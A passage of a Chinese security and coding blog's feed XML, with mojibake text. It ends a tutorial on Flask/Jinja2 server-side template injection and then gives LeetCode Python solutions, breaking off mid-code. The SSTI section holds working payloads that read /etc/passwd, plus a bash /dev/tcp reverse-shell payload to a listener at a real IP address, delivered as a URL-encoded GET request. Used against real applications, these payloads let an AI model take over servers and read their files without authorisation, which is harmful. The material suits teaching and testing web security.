&#39;os._wrap_close&#39;&gt;</code>ç±»ä¸­æ‰¾åˆ°äº†<code>popen</code>å‡½æ•°ï¼Œä»è€Œå¯ä»¥è¾¾åˆ°ä»»æ„æ–‡ä»¶è¯»å–çš„æ•ˆæœã€‚</p><p>payloadå¦‚ä¸‹</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">''.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['popen']('cat /etc/passwd').read()</span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTIæ¨¡ç‰ˆæ³¨å…¥/13.png" alt="13"></p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨Flaskæ¡†æ¶ä¸­çš„<code>config</code>å…¨å±€å¯¹è±¡æ¥è¯»å–ä»»æ„æ–‡ä»¶ï¼Œpayloadå¦‚ä¸‹</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()</span><br></pre></td></tr></table></figure><h4 id="SSTIåå¼¹Shell"><a href="#SSTIåå¼¹Shell" class="headerlink" title="SSTIåå¼¹Shell"></a>SSTIåå¼¹Shell</h4><p>å› ä¸ºæˆ‘ä»¬å¯ä»¥è°ƒç”¨åˆ°osæ¨¡å—ï¼Œå› æ­¤å¯ä»¥æ‰§è¡Œåå¼¹shellï¼Œæˆ‘ç°åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šå¯åŠ¨ç›‘å¬</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elssm@VM-20-13-centos ~&gt; nc -lvvp 9527</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9527</span><br><span class="line">Ncat: Listening on 0.0.0.0:9527</span><br></pre></td></tr></table></figure><p><code>nc</code>å‘½ä»¤éƒ¨åˆ†å‚æ•°ä»‹ç»</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-h å¸®åŠ©ä¿¡æ¯</span><br><span class="line">-i secs å»¶æ—¶çš„é—´éš”</span><br><span class="line">-l ç›‘å¬æ¨¡å¼ï¼Œç”¨äºå…¥ç«™è¿æ¥</span><br><span class="line">-L è¿æ¥å…³é—­å,ä»ç„¶ç»§ç»­ç›‘å¬</span><br><span class="line">-n æŒ‡å®šæ•°å­—çš„IPåœ°å€ï¼Œä¸èƒ½ç”¨hostname</span><br><span class="line">-o file è®°å½•16è¿›åˆ¶çš„ä¼ è¾“</span><br><span class="line">-p port æœ¬åœ°ç«¯å£å·</span><br><span class="line">-r éšæœºæœ¬åœ°åŠè¿œç¨‹ç«¯å£</span><br><span class="line">-s addr æœ¬åœ°æºåœ°å€</span><br><span class="line">-t ä½¿ç”¨TELNETäº¤äº’æ–¹å¼</span><br><span class="line">-u UDPæ¨¡å¼</span><br><span class="line">-v è¯¦ç»†è¾“å‡º--ç”¨ä¸¤ä¸ª-vå¯å¾—åˆ°æ›´è¯¦ç»†çš„å†…å®¹</span><br><span class="line">-w secs timeoutçš„æ—¶é—´</span><br><span class="line">-z å°†è¾“å…¥è¾“å‡ºå…³æ‰--ç”¨äºæ‰«ææ—¶</span><br></pre></td></tr></table></figure><p>åå¼¹shellçš„payloadå¦‚ä¸‹</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">''.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['popen']('bash -i &gt;&amp; /dev/tcp/42.193.150.138/9527 0&gt;&amp;1').read()</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å› ä¸ºå­˜åœ¨<code>&amp;</code>å­—ç¬¦ï¼Œå› æ­¤åœ¨URLè§£æä¸­ä¼šå‡ºé”™ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨Burpæ„é€ </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /ssti?code=&#123;&#123;''.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['popen']('bash%20-i%20&gt;%26%20/dev/tcp/42.193.150.138/9527%200&gt;%261').read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTIæ¨¡ç‰ˆæ³¨å…¥/14.png" alt="14"></p><p>æˆåŠŸè¿æ¥</p><p><img src="/2021/11/29/SSTIæ¨¡ç‰ˆæ³¨å…¥/15.png" alt="15"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹&quot;&gt;&lt;/a&gt;ç®€ä»‹&lt;/h4&gt;&lt;p&gt;SSTI(Server-Side Template Injection)æ¼æ´æ˜¯æ¨¡ç‰ˆå¼•æ“åœ¨ä½¿ç”¨æ¸²æŸ“å‡½æ•°çš„æ—¶å€™ï¼Œç”±äºä»£ç ä¸è§„èŒƒè€Œå¯¼è‡´çš„ä»£ç æ³¨å…¥æ¼
      
    
    </summary>
    
    
      <category term="Web Security" scheme="elssm.github.io/tags/Web-Security/"/>
    
  </entry>
  
  <entry>
    <title>è¿‘æœŸLeetcodeé¢˜è§£</title>
    <link href="elssm.github.io/2021/11/24/%E8%BF%91%E6%9C%9FLeetcode%E9%A2%98%E8%A7%A3/"/>
    <id>elssm.github.io/2021/11/24/è¿‘æœŸLeetcodeé¢˜è§£/</id>
    <published>2021-11-24T04:12:45.000Z</published>
    <updated>2021-12-13T09:54:29.253Z</updated>
    
    <content type="html"><![CDATA[<h4 id="å‰‘æŒ‡-Offer-43-1ï½n-æ•´æ•°ä¸­-1-å‡ºç°çš„æ¬¡æ•°-hard"><a href="#å‰‘æŒ‡-Offer-43-1ï½n-æ•´æ•°ä¸­-1-å‡ºç°çš„æ¬¡æ•°-hard" class="headerlink" title="å‰‘æŒ‡ Offer 43. 1ï½n æ•´æ•°ä¸­ 1 å‡ºç°çš„æ¬¡æ•°(hard)"></a>å‰‘æŒ‡ Offer 43. 1ï½n æ•´æ•°ä¸­ 1 å‡ºç°çš„æ¬¡æ•°(hard)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">countDigitOne</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        å¯¹äº305295è¿™ä¸ªæ•°è€Œè¨€</span></span><br><span class="line"><span class="string">        æˆ‘ä»¬å‡è®¾ä»ç™¾ä½å¼€å§‹ç®—ï¼Œç™¾ä½å‰é¢305è®¡ä¸ºa,ç™¾ä½åé¢95è®¡ä¸ºbï¼Œç™¾ä½æ•°ç­‰äºn%100ï¼Œ100è®¡ä¸ºbase</span></span><br><span class="line"><span class="string">        å½“ç™¾ä½æ•°å¤§äº1çš„æ—¶å€™</span></span><br><span class="line"><span class="string">            ç™¾ä½æ•°çš„å‰åŠæ®µå¯ä»¥å–å€¼ä¸º0ï½305ï¼Œä¸€å…±æœ‰a+1ä¸ªæ•°ï¼ŒååŠæ®µå¯ä»¥å–0ï½99ï¼Œä¸€å…±æœ‰baseä¸ªæ•°</span></span><br><span class="line"><span class="string">            åˆ™ç™¾ä½ä¸Š1èƒ½å–åˆ°çš„ä¸ªæ•°æ˜¯(a+1)*baseä¸ªæ•°</span></span><br><span class="line"><span class="string">        å¯¹äº305195è¿™ä¸ªæ•°è€Œè¨€</span></span><br><span class="line"><span class="string">        å½“ç™¾ä½æ•°ç­‰äº1çš„æ—¶å€™ï¼Œåˆ†ä¸¤ç§æƒ…å†µ</span></span><br><span class="line"><span class="string">            1.ç™¾ä½æ•°çš„å‰åŠæ®µå¯ä»¥å–å€¼ä¸º0ï½304ï¼Œä¸€å…±æœ‰aä¸ªæ•°ï¼ŒååŠæ®µå¯ä»¥å–0ï½99ï¼Œä¸€å…±æœ‰baseä¸ªæ•°ã€‚</span></span><br><span class="line"><span class="string">            2.ç™¾ä½æ•°çš„å‰åŠæ®µå¯ä»¥å–å€¼ä¸º305ï¼Œä¸€å…±æœ‰1ä¸ªæ•°ï¼ŒååŠæ®µå¯ä»¥å–0ï½95ï¼Œä¸€å…±æœ‰b+1ä¸ªæ•°ã€‚</span></span><br><span class="line"><span class="string">            åˆ™ç™¾ä½ä¸Š1èƒ½å–åˆ°çš„ä¸ªæ•°æ˜¯(a*base+1*(b+1))ä¸ªæ•°</span></span><br><span class="line"><span class="string">        å¯¹äº305095è¿™ä¸ªæ•°è€Œè¨€</span></span><br><span class="line"><span class="string">        å½“ç™¾ä½æ•°å°äº1çš„æ—¶å€™</span></span><br><span class="line"><span class="string">            ç™¾ä½æ•°çš„å‰åŠæ®µå¯ä»¥å–å€¼ä¸º0ï½304ï¼Œä¸€å…±æœ‰aä¸ªæ•°ï¼ŒååŠæ®µå¯ä»¥å–0ï½99ï¼Œä¸€å…±æœ‰baseä¸ªæ•°</span></span><br><span class="line"><span class="string">            åˆ™ç™¾ä½ä¸Š1èƒ½å–åˆ°çš„ä¸ªæ•°æ˜¯(a*base)ä¸ªæ•°</span></span><br><span class="line"><span class="string">        ä¹‹åwhileå¾ªç¯åˆ†ä¸‰ç§æƒ…å†µç»Ÿè®¡æ¯ä¸€ä½ä¸Š1çš„ä¸ªæ•°å³å¯</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        base = <span class="number">1</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> base &lt;= n:</span><br><span class="line">            b = n % base</span><br><span class="line">            a = n // base</span><br><span class="line">            cur = a % <span class="number">10</span></span><br><span class="line">            a //= <span class="number">10</span></span><br><span class="line">            <span class="keyword">if</span> cur &gt; <span class="number">1</span>:</span><br><span class="line">                res += (a + <span class="number">1</span>) * base</span><br><span class="line">            <span class="keyword">elif</span> cur == <span class="number">1</span>:</span><br><span class="line">                res += (a * base + b + <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res += a * base</span><br><span class="line">            base *= <span class="number">10</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="å‰‘æŒ‡-Offer-51-æ•°ç»„ä¸­çš„é€†åºå¯¹-hard"><a href="#å‰‘æŒ‡-Offer-51-æ•°ç»„ä¸­çš„é€†åºå¯¹-hard" class="headerlink" title="å‰‘æŒ‡ Offer 51. æ•°ç»„ä¸­çš„é€†åºå¯¹(hard)"></a>å‰‘æŒ‡ Offer 51. æ•°ç»„ä¸­çš„é€†åºå¯¹(hard)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reversePairs</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        é€šè¿‡ä¸æ–­åœ°æ’å…¥å€¼æ¥å¯»æ‰¾å‰é¢å¤§äºå½“å‰å€¼çš„å…ƒç´ ä¸ªæ•°</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = <span class="number">0</span> <span class="comment">#ç»Ÿè®¡è®¡æ•°</span></span><br><span class="line">        sorted_nums = [] <span class="comment">#å‡†å¤‡ä¸€ä¸ªå¾…æ’å…¥çš„åˆ—è¡¨</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            <span class="comment">#æ‰¾åˆ°numsä¸­å½“å‰æ•°åœ¨sorted_numsä¸­è¦æ’å…¥çš„ä¸‹æ ‡</span></span><br><span class="line">            k = bisect.bisect(sorted_nums, nums[i]) </span><br><span class="line">            <span class="comment">#å½“å‰ä¸‹æ ‡å‡å»è¦æ’å…¥çš„ä¸‹æ ‡å°±æ˜¯åœ¨å¤§äºå½“å‰æ•°çš„ä¸ªæ•°</span></span><br><span class="line">            res += i - k</span><br><span class="line">            sorted_nums[k:k] = [nums[i]] <span class="comment">#æ’å…¥å½“å‰å…ƒç´ </span></span><br><span class="line">            <span class="comment"># bisect.insort(sorted_nums,nums[i]) #æ’å…¥å½“å‰å…ƒç´ </span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="å‰‘æŒ‡-Offer-60-nä¸ªéª°å­çš„ç‚¹æ•°-medium"><a href="#å‰‘æŒ‡-Offer-60-nä¸ªéª°å­çš„ç‚¹æ•°-medium" class="headerlink" title="å‰‘æŒ‡ Offer 60. nä¸ªéª°å­çš„ç‚¹æ•°(medium)"></a>å‰‘æŒ‡ Offer 60. nä¸ªéª°å­çš„ç‚¹æ•°(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#import numpy as np</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dicesProbability</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: List[float]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#å·ç§¯åšæ³•</span></span><br><span class="line">        <span class="comment"># conv1 = [1.0/6 for i in range(6)]</span></span><br><span class="line">        <span class="comment"># if n==1:</span></span><br><span class="line">        <span class="comment">#     return conv1</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     convN = self.dicesProbability(n-1)</span></span><br><span class="line">        <span class="comment">#     return np.convolve(convN,conv1)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#åŠ¨æ€è§„åˆ’</span></span><br><span class="line">        dp = [<span class="number">1.0</span>/<span class="number">6</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">6</span>)] <span class="comment">#éª°å­æ•°ä¸º1æ—¶å€™çš„å€¼</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,n+<span class="number">1</span>):</span><br><span class="line">            <span class="comment">#tmpé•¿åº¦ä¸ºnä¸ªéª°å­èƒ½å–åˆ°çš„å€¼çš„ä¸ªæ•°ï¼Œå…¨éƒ¨åˆå§‹åŒ–ä¸º0</span></span><br><span class="line">            tmp = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(i*<span class="number">5</span>+<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(dp)): <span class="comment">#n-1ä¸ªéª°å­å–åˆ°çš„æ‰€æœ‰å€¼</span></span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">6</span>): <span class="comment">#åŠ ä¸Šç¬¬nä¸ªéª°å­å–å¾—çš„å€¼</span></span><br><span class="line">                    tmp[j+k] += dp[j]/<span class="number">6.0</span> <span class="comment">#ä¹‹å‰çš„å€¼å’Œå½“å‰çš„å€¼å åŠ </span></span><br><span class="line">            dp = tmp <span class="comment">#å¾—åˆ°æœ€æ–°çš„å€¼èµ‹å€¼ç»™dp</span></span><br><span class="line">        <span class="keyword">return</span> dp</span><br></pre></td></tr></table></figure><h4 id="å‰‘æŒ‡-Offer-12-çŸ©é˜µä¸­çš„è·¯å¾„-medium"><a href="#å‰‘æŒ‡-Offer-12-çŸ©é˜µä¸­çš„è·¯å¾„-medium" class="headerlink" title="å‰‘æŒ‡ Offer 12. çŸ©é˜µä¸­çš„è·¯å¾„(medium)"></a>å‰‘æŒ‡ Offer 12. çŸ©é˜µä¸­çš„è·¯å¾„(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exist</span><span class="params">(self, board, word)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type board: List[List[str]]</span></span><br><span class="line"><span class="string">        :type word: str</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(board,i,j,word,k)</span>:</span></span><br><span class="line">            <span class="comment">#åˆ¤æ–­ä¸‹æ ‡æ˜¯å¦è¶Šç•Œ</span></span><br><span class="line">            <span class="keyword">if</span> i&lt;<span class="number">0</span> <span class="keyword">or</span> i == len(board) <span class="keyword">or</span> j &lt; <span class="number">0</span> <span class="keyword">or</span> j == len(board[<span class="number">0</span>]):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="comment">#å¦‚æœå½“å‰å€¼å’Œwordå½“å‰å€¼ä¸ç›¸ç­‰ï¼Œç›´æ¥è¿”å›</span></span><br><span class="line">            <span class="keyword">if</span> board[i][j] != word[k]:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="comment">#å¦‚æœè®¿é—®åˆ°äº†wordæœ€åä¸€ä¸ªå€¼ï¼Œè¿”å›True</span></span><br><span class="line">            <span class="keyword">if</span> k == len(word)<span class="number">-1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="comment">#å…ˆå°†å½“å‰å€¼ç½®ç©ºï¼Œé˜²æ­¢åé¢é‡å¤è®¿é—®</span></span><br><span class="line">            board[i][j] = <span class="string">''</span></span><br><span class="line">            res = dfs(board, i<span class="number">-1</span>, j, word, k+<span class="number">1</span>) <span class="keyword">or</span> dfs(board, i, j<span class="number">-1</span>, word, k+<span class="number">1</span>) \</span><br><span class="line">            <span class="keyword">or</span> dfs(board, i+<span class="number">1</span>, j, word, k+<span class="number">1</span>) <span class="keyword">or</span> dfs(board, i, j+<span class="number">1</span>, word, k+<span class="number">1</span>)</span><br><span class="line">            board[i][j] = word[k]</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(board)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(board[i])):</span><br><span class="line">                <span class="keyword">if</span> dfs(board,i,j,word,<span class="number">0</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="å‰‘æŒ‡-Offer-41-æ•°æ®æµä¸­çš„ä¸­ä½æ•°-hard"><a href="#å‰‘æŒ‡-Offer-41-æ•°æ®æµä¸­çš„ä¸­ä½æ•°-hard" class="headerlink" title="å‰‘æŒ‡ Offer 41. æ•°æ®æµä¸­çš„ä¸­ä½æ•°(hard)"></a>å‰‘æŒ‡ Offer 41. æ•°æ®æµä¸­çš„ä¸­ä½æ•°(hard)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> heapq <span class="keyword">import</span> *</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MedianFinder</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># èœé¸¡çš„æ•°ç»„æ’åºåšæ³•</span></span><br><span class="line">    <span class="comment"># def __init__(self):</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     initialize your data structure here.</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     self.res=[]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># def addNum(self, num):</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     :type num: int</span></span><br><span class="line">    <span class="comment">#     :rtype: None</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     self.res.append(num)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># def findMedian(self):</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     :rtype: float</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     self.res=sorted(self.res)</span></span><br><span class="line">    <span class="comment">#     if len(self.res)%2:</span></span><br><span class="line">    <span class="comment">#         return self.res[len(self.res)/2]</span></span><br><span class="line">    <span class="comment">#     else:</span></span><br><span class="line">    <span class="comment">#         return (self.res[len(self.res)/2-1]+self.res[len(self.res)/2])/2.0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#å¤§ä½¬çš„å †è§£æ³•</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment">#heapqé»˜è®¤å°é¡¶å †</span></span><br><span class="line">        self.A = [] <span class="comment"># å°é¡¶å †ï¼Œä¿å­˜è¾ƒå¤§çš„ä¸€åŠ</span></span><br><span class="line">        <span class="comment">#å®ç°å¤§é¡¶å †è¿›å †çš„æ—¶å€™å–ç›¸åæ•°</span></span><br><span class="line">        self.B = [] <span class="comment"># å¤§é¡¶å †ï¼Œä¿å­˜è¾ƒå°çš„ä¸€åŠ</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addNum</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        <span class="comment"># å¦‚æœä¸ç›¸ç­‰ï¼Œè¯´æ˜Aå¤šäº†ä¸€ä¸ª</span></span><br><span class="line">        <span class="comment"># æŠŠå½“å‰æ•°å­˜åˆ°Aï¼Œè°ƒæ•´å †ä¹‹åï¼Œè¿”å›Aä¸­çš„æœ€å°å€¼ç»™B</span></span><br><span class="line">        <span class="keyword">if</span> len(self.A) != len(self.B):</span><br><span class="line">            heappush(self.B, -heappushpop(self.A, num))</span><br><span class="line">        <span class="comment"># å¦‚æœç›¸ç­‰ï¼Œå°±æŠŠå½“å‰æ•°ç»™Bï¼Œè°ƒæ•´å †ä¹‹åï¼Œè¿”å›Bä¸­çš„æœ€å¤§å€¼ç»™A</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            heappush(self.A, -heappushpop(self.B, -num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findMedian</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># å¦‚æœæ˜¯å¥‡æ•°ï¼Œç›´æ¥è¿”å›Aä¸­çš„æœ€å°å€¼</span></span><br><span class="line">        <span class="comment"># å¦‚æœæ˜¯å¶æ•°ï¼Œåˆ™è¿”å›ä¸¤è€…å †é¡¶çš„å¹³å‡å€¼</span></span><br><span class="line">        <span class="comment"># print(self.A)</span></span><br><span class="line">        <span class="comment"># print(self.B)</span></span><br><span class="line">        <span class="keyword">return</span> self.A[<span class="number">0</span>] <span class="keyword">if</span> len(self.A) != len(self.B) <span class="keyword">else</span> (self.A[<span class="number">0</span>] - self.B[<span class="number">0</span>]) / <span class="number">2.0</span></span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"><span class="comment"># Your MedianFinder object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># obj = MedianFinder()</span></span><br><span class="line"><span class="comment"># obj.addNum(num)</span></span><br><span class="line"><span class="comment"># param_2 = obj.findMedian()</span></span><br></pre></td></tr></table></figure><h4 id="å‰‘æŒ‡-Offer-13-æœºå™¨äººçš„è¿åŠ¨èŒƒå›´-medium"><a href="#å‰‘æŒ‡-Offer-13-æœºå™¨äººçš„è¿åŠ¨èŒƒå›´-medium" class="headerlink" title="å‰‘æŒ‡ Offer 13. æœºå™¨äººçš„è¿åŠ¨èŒƒå›´(medium)"></a>å‰‘æŒ‡ Offer 13. æœºå™¨äººçš„è¿åŠ¨èŒƒå›´(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">movingCount</span><span class="params">(self, m, n, k)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type m: int</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :type k: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        